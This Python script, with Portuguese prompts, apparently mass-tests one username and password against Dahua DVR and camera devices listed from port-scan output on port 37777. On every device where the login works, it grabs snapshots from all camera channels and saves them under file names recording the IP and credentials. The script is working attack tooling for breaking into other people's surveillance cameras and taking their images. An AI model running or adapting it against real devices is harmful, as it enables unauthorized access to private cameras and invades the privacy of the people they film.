# -*- coding: utf-8 -*-
#!/usr/bin/env python

from threading import Thread
import gc,time
import time,os
from utils.dahua import DahuaController, HTTP_API_REQUESTS
from tqdm import tqdm


def clear():
    print('\n' * 100)


clear()
ipok = 0
fail = 0
tt = []
imgt = 0
snapshots_counts = 0
pauseb = 0

snapshots_folder = "snapshots"
usr = input('[?] Digite o user que deseja usar \n-->> ')
senha = input('[?] Digite a senha que deseja usar \n-->> ')


print(usr,senha)




f = open("ips.txt", "r")

for x in f:
      ip = x.rstrip('\n')
     
      preeip = ip.replace("Discovered open port 37777/tcp on ",'')
      preeeip = preeip.replace(" ",'')
      tt.append(str(preeeip))
     

tok = int(len(tt))
print('[!] O total de',str(tok), 'IPs vão ser analizados')


def dahua_login(server_ip, port, login, password):
    global ipok
    
    try:
        dahua = DahuaController(server_ip, port, login, password)
        #print("%s Snapshot capturada" % server_ip)
    except Exception as e:
        print(e, 'dahua_login login')
        
        
    if dahua.status == 0:
        return True
    elif dahua.status == 2:
        return "Blocked"
    else:
        return None

def make_snapshots(server_ip,login,password):
    global imgt
    port = 37777
    ok = False
    global snapshots_counts
    try:
        dahua = DahuaController(server_ip, port, login, password)
        if dahua.status != 0:
            ok = False
            return
        channels_count = dahua.channels_count
    except Exception as e:
        #print(e, 'make_snapshots login')
        ok = False
        return
    dead_counter = 0
    for channel in range(channels_count):
        if dead_counter > 5:
            break
        try:
            jpeg = dahua.get_snapshot(channel)
        except Exception as e:
            print(e, 'make_snapshots getsnapshot')
            ok = False
            dead_counter += 1
            continue
        try:
            cc = ("./snapshot/%s_%s_%s_%s_%d.jpg" % (server_ip, port, login, password,channel + 1))
            outfile = open("./snapshot/%s_%s_%s_%s_%d.jpg" % (server_ip, port, login, password,channel + 1), 'wb')
            outfile.write(jpeg)


            imgt += 1
            
            snapshots_counts += 1
            ok = True
            dead_counter = 0
        except Exception as e:
            #print(e, 'make_snapshots save')
            ok = False
            continue
        



def Auth(i):
    try:
        Server = i
        global ipok
        global fail
        res = dahua_login(Server, 37777, usr, senha)
        if res:
            ipok += 1
            make_snapshots(Server,usr,senha)
            
            return True
        else:
            fail += 1
        return True
    except Exception as e:
        #print('[!] Erro: def Auth()', e)
        return False



for i in tqdm(tt):
    try:
     t1 = Thread(target=Auth, args=(i,))
     t1.start()
     pass
    except:
     pass

def start():
    print('[!] O Total de',(str(fail) + str(ipok)), 'foram analizados, apenas',  str(ipok), 'possuem falhas!', str(imgt) , "tiradas")
    return True

start()
use = True
full = True
print('[!] Tentando salvar o arquivo SmartPass.xml/DB')
input('[!] Aperte Enter Para Fechar')
